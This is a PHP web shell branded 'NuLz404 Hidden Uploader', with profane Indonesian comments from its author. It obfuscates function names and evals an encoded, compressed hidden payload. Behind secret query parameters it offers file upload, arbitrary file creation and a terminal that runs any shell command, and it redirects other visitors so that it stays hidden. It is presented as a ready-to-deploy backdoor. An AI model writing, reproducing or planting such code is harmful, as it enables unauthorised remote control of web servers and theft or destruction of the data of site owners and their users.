<?php
//NuLz404
//Kalo Recode Nama gw jangan di Apus anjing
//Kontol Lu Semua
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$domainUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';

function Ikg($vHjCLy){
    $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
    $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
    $nelrts = 's'.'tr'.'l'.'en';
    $rhc = 'c'.'h'.'r';
    $dro = 'o'.'r'.'d';
    $vHjCLy=$gflate($b64($vHjCLy));
     for($i=0;$i<$nelrts($vHjCLy);$i++){
        $vHjCLy[$i] = $rhc($dro($vHjCLy[$i])-1);
     }
     return $vHjCLy;
}/****/@/*55555*/null; /******/@/*55555*/eval/******/(Ikg("jVDtbuIwEHyAPIXPSi/Jj4YDVMqHUBUd5qAHJXWS0qqNrADbEDWEnG1UqqrPfk6gSP06nWXJ653Znd1BSB0tuUfmN1jl8snUmUfoFaG3xsD3XfZzNCQXPhu6RmhZ6Fkr6HqSR4sFByFQF33Nt/Edv8twR3tBkApAX4tcs/6ETh3aI70i+k+pD1XvBf/ZgpLxxCfM6fXeVGr6jK8fBfCPeoH6MeeXWs8IO5r+UHLyZc42WbQC01K5DU9VzvxsSU9thc6QsZQyN1B7FwjDQjbC7UrlQC6lBhPPDw8pSi4D4vksoMNQzahL2Eolgyn82YCQKKCjNsJ2oW7jox+OulOYiSWkKQp4WmLoGe/b4ZdbvIvYhTMmOHwPugNX/UZ9hey7Dd2yx8HI13ygfDp2Yshkie+de0V/A89gp6686mj3SQosBsnm60yqGmHi0gO1fZQntoQUYh6t7DWPK7O1bNRPG9VGrX5SaztOf9u6PE/G86covpmyfvZA627cDPjg0T33tjdRUBGQLcZqtiiGs/kykixZdKvNVuuk1mqeVr8XnnXVJMVrdf4C"));
//get uid:user gid:group
$func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
$psx_euid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'u'.'i'.'d';
$psx_egid = 'p'.'os'.'ix'.'_'.'ge'.'te'.'g'.'i'.'d';
$psx_usr_uid = 'p'.'os'.'ix'.'_'.'g'.'et'.'pw'.'u'.'i'.'d';
$psx_grp_gid = 'p'.'os'.'ix'.'_'.'ge'.'tg'.'rg'.'i'.'d';
$myuid = 'g'.'et'.'my'.'ui'.'d';
$mygid = 'g'.'et'.'my'.'gi'.'d';
$cur_usr = 'g'.'et'.'_'.'cu'.'rr'.'en'.'t'.'_'.'us'.'er';
if (!$func_exist($psx_egid)) {
    $user = $func_exist($cur_usr) ? @$cur_usr() : "????";
    $uid = $func_exist($myuid) ? @$myuid() : "????";
    $gid = $func_exist($mygid) ? @$mygid() : "????";
    $group = "?";
} else {
    $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$psx_usr_uid($psx_euid()) : array("name" => "????", "uid" => "????");
    $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$psx_grp_gid($psx_egid()) : array("name" => "????", "gid" => "????");
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
}

$host = $_SERVER['SERVER_NAME'];
$gcw = 'ge'.'tc'.'wd';
$path = $gcw();

function komend( $komendnya, $path ) {
    $hayoloh = 'htm'.'lspe'.'cialc'.'hars';
    $sgc = 's'.'trea'.'m_g'.'et_c'.'ont'.'ents';
    $proc = 'pr'.'oc'.'_'.'o'.'pen';
    $proc_cls = 'p'.'ro'.'c'.'_'.'c'.'lose';
    $pop = 'p'.'ope'.'n';
    $pop_cls = 'pc'.'lose';
    $exc = 'e'.'x'.'ec';
    $sys = 's'.'ys'.'t'.'em';
    $pass = 'pa'.'s'.'sth'.'ru';
    $sh_exc = 's'.'he'.'ll'.'_'.'e'.'xe'.'c';
    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
    $preg = 'pr'.'eg_'.'mat'.'ch';
    $regex = '2'.'>'.'&'.'1';
    if ( !$preg( '/'.$regex.'/i', $komendnya ) ) {
        $komendnya = $komendnya.' '.$regex;
    }

    if ( $func_exist( $proc ) ) {
        $descriptors = [
            0 => [ 'pipe', 'r' ],
            1 => [ 'pipe', 'w' ],
            2 => [ 'pipe', 'w' ],
        ];
        $process = $proc( $komendnya, $descriptors, $pipes, $path );
        if ( is_resource( $process ) ) {
            fwrite( $pipes[ 0 ], 'input_data_here' );
            fclose( $pipes[ 0 ] );
            $output = $sgc( $pipes[ 1 ] );
            $errors = $sgc( $pipes[ 2 ] );
            fclose( $pipes[ 1 ] );
            fclose( $pipes[ 2 ] );
            $resultCode = $proc_cls( $process );
            echo $hayoloh($output);
        }
    } elseif ( $func_exist( $pop ) ) {
        $process = $pop( $komendnya, 'r' );
        $read = fread( $process, 2096 );
        $hayoloh(print_r( "$process: ".gettype( $process )."\n$read \n" ));
        $pop_cls( $process );
    } elseif ( $func_exist( $exc ) ) {
        $exc( $komendnya, $output, $returnCode );

        if ( $returnCode === 0 ) {
            $res = implode( $output );
            echo $hayoloh($res);
            ob_flush();
            flush();
        }
    } elseif ( $func_exist( $sys ) ) {
        $out = $sys( $komendnya );
        echo $hayoloh($out);
    } elseif ( $func_exist( $pass ) ) {
        $out = $pass( $komendnya );
        echo $hayoloh($out);
    } elseif ( $func_exist( $sh_exc ) ) {
        $out = $sh_exc( $komendnya );
        echo $hayoloh($out);
    } else {
        echo "<b>The Function To Run The Command Is Disable On This Serever</b>";
    }
}

if (isset($_POST['buatfile'])) {
    $namafile = $_POST['namafile'];
    $isifile = $_POST['isifile'];
    $handle = fopen("$namafile", "w");
    if ($isifile) {
        $buatfile = fwrite($handle, $isifile);
    } else {
        $buatfile = $handle;
    }
    if ($buatfile) {
        echo "<script>alert('Berhasil Buat File :)');</script>";
    } else {
        echo "<script>alert('Gagal Buat File :(');</script>";
    }
}

if (isset($_GET['nulz'])) {
	if (isset($_GET['ganteng'])) {
        echo '
        <!DOCTYPE html>
        <html lang="en">
            <head>
            <title>.:NuLz404 Hidden Uploader:.</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta http-equiv="X-UA-Compatible" content="ie=edge">
                <meta name="description" content="This Is A Hidden Uploader">
                <meta name="author" content="Haxorstars">
                <meta name="robots" content="noindex, nofollow">
                <link rel="shortcut icon" href="https://nulz-archive.vercel.app/archive/nulz.ico" type="image/x-icon" />
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" type="text/css" />
                <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet" type="text/css" />
                <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
                <style>
                    body {
                        background: #000000;
                        display: flex;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                    }
                    .root {
                        display: flex;
                        flex-wrap: wrap;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        color: #eaeaea;
                        width: 100%;
                        height: auto;
                    }
                    .root h1 {
                        style="font-size: 3vh;
                        font-weight: 700;
                        font-family: Trade Winds;
                        text-shadow:0pt 0pt 10pt #fc0909,0pt 0pt 20pt #ffffff,0pt 0pt 30pt #fc0909;
                    }
                    .root form {
                        width: 80%;
                        display: flex;
                        flex-direction: column;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                    }
                    .root form button {
                        background: rgba(255,255,255,0.1);
                        color: #ffffff;
                        border: 1px solid #eaeaea;
                        border-radius: 10px;
                        font-size: 1.75vh;
                        font-weight: 700;
                        padding: 2.5px 5px 2.5px;
                        margin: 0;
                    }
                    .root form button:hover {
                        background: rgba(0,0,0,0.75);
                        box-shadow: 0 0 10pt rgba(255,0,0,0.50), 0 0 20pt rgba(255,0,0,0.75);
                    }

                    .terminal {
                        width: 100%;
                        background-color: #000000;
                        border-radius: 5px;
                        box-shadow: 0 0 20pt rgba(255, 255, 255, 0.5);
                    }
            
                    .terminal-header {
                        background: #ddd;
                        padding: 5px;
                        display: flex;
                        align-items: center;
                    }
            
                    .font-bold {
                        font-weight: 700;
                    }
            
                    .font-white {
                        color: #ffffff;
                    }
                    .font-black {
                        color: #000000;
                    }
                    .font-red {
                        color: #ff0000;
                    }
                    .font-blue {
                        color: #0000ff;
                    }
            
                    .terminal-img {
                        width: 3vh;
                    }
            
                    .button {
                        width: 12px;
                        height: 12px;
                        border-radius: 50%;
                        margin-right: 5px;
                    }
            
                    .terminal-content {
                        background: #000000;
                        width: 100%;
                        height: 70vh;
                        overflow-y: auto;
                        color: #00ff00;
                        font-size: 15px;
                        white-space: pre;
                        overflow-y: scroll;
                        overflow-x: scroll;
                    }
            
                    .terminal-input {
                        position: relative;
                        z-index: 1;
                        background: #000000;
                        display: flex;
                        padding: 10px 5px 10px;
                    }
            
                    .prompt {
                        font-size: 15px;
                        color: #0f0;
                    }
            
                    .terminalInput {
                        background: none;
                        border: none;
                        outline: none;
                        color: #ffffff;
                        flex: 1;
                        font-family: monospace;
                        font-size: 15px;
                    }
                    .terminalInput:hover {
                        background: none;
                        border: none;
                        outline: none;
                    }
                    .terminalInput:focus {
                        background: none;
                        border: none;
                        outline: none;
                    }
                    .terminalInput:active {
                        background: none;
                        border: none;
                        outline: none;
                    }
            
                    @media screen and (max-width: 500px) {
                        .root form {
                            width: 100%;
                        }
                        .terminal {
                            width: 100%;
                        }
                        .terminal-content {
                            font-size: 10px;
                        }
                        .prompt {
                            font-size: 10px;
                        }
                        .terminalInput {
                            font-size: 10px;
                        }
                    }
                </style>
            </head>
        <body>
            <div class="root">
                <div class="mb-4">
                    <a href="?nulz&ganteng"><button type="button" class="btn btn-outline-light">Home</button></a>
                    <a href="?nulz&ganteng&file"><button type="button" class="btn btn-outline-light">Buat File</button></a>
                    <a href="?nulz&ganteng&terminal"><button type="button" class="btn btn-outline-light">Terminal</button></a>
                </div>
                <h1>NuLz404 Hidden Uploader</h1>
                <form action="" method="post" enctype="multipart/form-data">
                <div class="mb-3" style="display: flex; justify-content: center; align-items: center;">
                    <label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 1.75vh; margin: 1rem;">Upload File</label>
                    <input type="file" name="file[]" id="file" onchange="this.form.submit()" multiple>
                </div>';
                if ($_SERVER["REQUEST_METHOD"] === "POST") {
                    if (isset($_FILES["file"])) {
                        $countFiles = count($_FILES["file"]["name"]);
                        for ($i = 0; $i < $countFiles; $i++) {
                            $fi_le_Na_me = $_FILES["file"]["name"][$i];
                            $location = "" . $fi_le_Na_me;
                            $uploadFunction = "m"."ove" . "_up" . "loa"."ded_fi" . "le";
                
                            if ($uploadFunction($_FILES["file"]["tmp_name"][$i], $location)) {
                                echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
                                echo "<span style='color: #00ff00;'>Upload Success</span>";
                                echo "<span>file => <a href='" . $fi_le_Na_me . "' color='#0092ff' target='_blank'>" . $fi_le_Na_me . "</a></span><br/>";
                                echo "</div>";
                            } else {
                                echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
                                echo "<span style='color: #ff0000;'>Upload Failed :(</span>";
                                echo "<span>file => " . $fi_le_Na_me . "<br/>";
                                echo "</div>";
                            }
                        }
                    } else {
                        echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
                        echo "<span style='color: #fcf803;'>Tidak Ada File Yang Di Upload</span>";
                        echo "</div>";
                    }
                }
            ?>
            <?php
                if (isset($_GET['file'])) {
                    echo '
                    <div class="mb-3">
                        <label for="namafile" class="form-label">Buat File</label>
                        <input type="text" class="form-control form-control-sm" name="namafile" id="namafile" placeholder="nama file">
                        <textarea class="form-control form-control-sm mt-3" name="isifile" cols="80" rows="20" placeholder="isi file" id="isifile"></textarea>
                        <div class="mt-3 d-grid gap-2">
                            <input class="btn btn-outline-light" type="submit" name="buatfile" value="Buat File">
                        </div>
                    </div>
                    ';
                }
                '</form>';
?>
<?php
if (isset($_GET['terminal'])) {
?>
                <div class="terminal">
                    <div class="terminal-header">
                        <img class="terminal-img" src="https://raw.githubusercontent.com/haxorstars/archive/main/media/terminal.png" alt="terminal">
                        <span class="font-bold font-black">Terminal</span>
                    </div>
                <textarea class="terminal-content" id="terminalContent" readonly>
<?php
if (isset($_POST['exe'])) {
$komendnya = htmlspecialchars($_POST['komend']);
htmlspecialchars(komend( $komendnya, $path ));
}
?>
                </textarea>
                    <div class="terminal-input">
                        <form action="" method="POST" enctype="multipart/form-data">
                            <span class="prompt"><font class="font-white">[</font><font class="font-red"><?=$user?></font><font class="font-white">@</font><font class="font-blue"><?=$host?></font><font class="font-white">]</font><font class="font-red">$</font></span>
                            <input type="text" name="komend" id="terminalInput" class="terminalInput" autofocus autocomplete="off">
                            <input type="submit" name="exe" style="display: none;">
                        </form>
                    </div>
                </div>
            </div>
        </body>
        </html>
<?php
}
    } else {
	echo '<script>window.location.href = "'.$domainUrl.'";</script>';
    }
} else {
	echo '<script>window.location.href = "'.$domainUrl.'";</script>';
}
?>
